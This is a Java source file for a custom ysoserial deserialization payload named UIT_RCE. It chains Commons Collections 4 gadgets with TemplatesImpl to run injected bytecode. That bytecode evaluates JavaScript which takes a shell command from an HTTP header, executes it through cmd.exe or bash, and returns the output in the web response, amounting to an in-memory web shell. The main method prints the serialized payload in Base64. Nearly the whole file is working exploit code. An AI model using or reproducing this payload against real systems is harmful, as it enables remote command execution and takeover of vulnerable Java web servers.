package ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.ClassFiles;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;
import java.util.PriorityQueue;
import java.util.Queue;

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({ "org.apache.commons:commons-collections4:4.0" })
public class UIT_RCE extends PayloadRunner implements ObjectPayload<Queue<Object>> {
    @Override
    public Queue<Object> getObject(String header) throws Exception {
        String js_code = "isWin = java.lang.System.getProperty(\"os.name\").toLowerCase().contains(\"win\");" +
						"currentThread = org.springframework.web.context.request.RequestContextHolder.currentRequestAttributes();" +
						"requestFacade = currentThread.getRequest();" +
						"requestField = org.apache.catalina.connector.RequestFacade.class.getDeclaredField(\"request\");" +
						"requestField.setAccessible(true);" +
						"request = requestField.get(requestFacade);" +
						"response = request.getResponse();" +
						"outputStream = response.getOutputStream();" +
						"command = request.getHeader(\"" + header + "\");" +
						"pb = new java.lang.ProcessBuilder();" +
						"if (isWin) {" +
						"   pb.command(\"cmd.exe\", \"/c\", command);" +
						"} else {" +
						"   pb.command(\"bash\", \"-c\", command);" +
						"}" +
						"pb.redirectErrorStream(true);" +
						"bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(pb.start().getInputStream()));" +
						"result = \"\";" +
						"while ((line = bufferedReader.readLine()) != null) {" +
						"   result += line + \"\\n\";" +
						"}" +
						"outputStream.write(result.getBytes());" +
						"outputStream.close();";
//        String js_code = "calc.exe";
        final Object templates = createTemplatesImpl(js_code);
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));
        // stub data for replacement later
        queue.add(1);
        queue.add(1);

        // switch method called by comparator
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = 1;

        return queue;
    }

    public static Object createTemplatesImpl ( final String command ) throws Exception {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            return createTemplatesImpl(
                command,
                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }

        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }


    public static <T> T createTemplatesImpl ( final String js_code, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
        throws Exception {
        final T templates = tplClass.newInstance();

        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Gadgets.StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        final CtClass clazz = pool.get(Gadgets.StubTransletPayload.class.getName());
        // run command in static initializer
        String cmd = "(new javax.script.ScriptEngineManager()).getEngineByName(\"JavaScript\").eval(\"" +
            js_code.replace("\\", "\\\\").replace("\"", "\\\"") +
            "\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
            classBytes, ClassFiles.classAsBytes(Gadgets.Foo.class)
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }

    public static void main(final String[] args) throws Exception {
        UIT_RCE obj = new UIT_RCE();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj.getObject("CMD"));
        System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));
    }
}